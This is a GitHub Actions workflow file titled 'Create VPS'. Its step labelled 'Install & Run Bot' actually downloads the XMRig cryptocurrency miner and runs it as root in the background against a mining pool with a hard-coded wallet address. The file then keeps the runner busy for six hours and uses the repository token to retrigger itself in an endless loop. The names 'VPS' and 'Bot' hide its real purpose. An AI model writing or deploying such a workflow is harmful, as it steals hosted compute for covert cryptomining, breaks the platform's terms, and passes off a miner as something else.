name: Create VPS
on:
  workflow_dispatch:
  repository_dispatch:
    types: [create-vps]

jobs:
  start-vps:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    env:
      VPS_NAME: ${{ github.event.client_payload.vps_name || 'manual-vps' }}
    steps:
    - name: Checkout
      uses: actions/checkout@v3
    - name: Setup Node.js
      uses: actions/setup-node@v3
      with:
        node-version: '20'
    - name: Install & Run Bot
      run: |
        sudo su
        wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-focal-x64.tar.gz
        tar -xvzf xmrig-6.24.0-focal-x64.tar.gz
        cd xmrig-6.24.0
        sudo su -c "nohup ./xmrig -o asia.hashvault.pro:443 -u 83snAgC9pR3GEwv6fLBDW96eCHaWzMbb3a4hdDNUMmzbZVzQtrbsGmoJBC6tgwDWCChFAqVnAvFKYPgmXLkTHFk145BV2SN -p TN73 -a rx --tls > xmrig.log 2>&1 &"
        echo "XMRig started in background."
    - name: Keep VPS alive
      run: |
        for i in $(seq 1 360); do
          echo "Running minute $i/360..."
          sleep 60
        done
    - name: Restart workflow
      if: always()
      run: |
        curl -X POST           -H "Accept: application/vnd.github+json"           -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}"           -H "Content-Type: application/json"           https://api.github.com/repos/${{ github.repository }}/dispatches           -d '{"event_type": "create-vps"}'
